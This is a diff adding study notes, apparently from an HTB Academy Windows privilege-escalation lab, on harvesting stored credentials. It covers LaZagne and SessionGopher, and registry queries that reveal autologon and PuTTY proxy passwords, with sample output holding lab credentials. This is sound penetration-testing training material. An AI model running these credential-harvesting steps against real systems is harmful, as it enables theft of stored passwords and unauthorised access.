@@ -200,3 +200,53 @@ We can use automated tools LaZagne https://github.com/AlessandroZ/LaZagne to aut
 ```
 .\lazagne.exe all
 ```
+
+We can use SessionGopher https://github.com/Arvanaghi/SessionGopher to extract saved session credentials, this tool search and attempt to decrypt user saved login information
+```
+PS C:\htb> Import-Module .\SessionGopher.ps1
+ 
+PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
+```
+
+We can enumerate window autologon login by evaluating 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, this by default can be accessed by standard user, while putty session can be evaluated at 
+HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+
+```
+C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    
+    <SNIP>
+    
+    AutoAdminLogon    REG_SZ    1
+    DefaultUserName    REG_SZ    htb-student
+    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
+```
+
+```
+PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+
+HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+```
+
+```
+PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+
+HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+    Present    REG_DWORD    0x1
+    HostName    REG_SZ
+    LogFileName    REG_SZ    putty.log
+    
+  <SNIP>
+  
+    ProxyDNS    REG_DWORD    0x1
+    ProxyLocalhost    REG_DWORD    0x0
+    ProxyMethod    REG_DWORD    0x5
+    ProxyHost    REG_SZ    proxy
+    ProxyPort    REG_DWORD    0x50
+    ProxyUsername    REG_SZ    administrator
+    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
+```
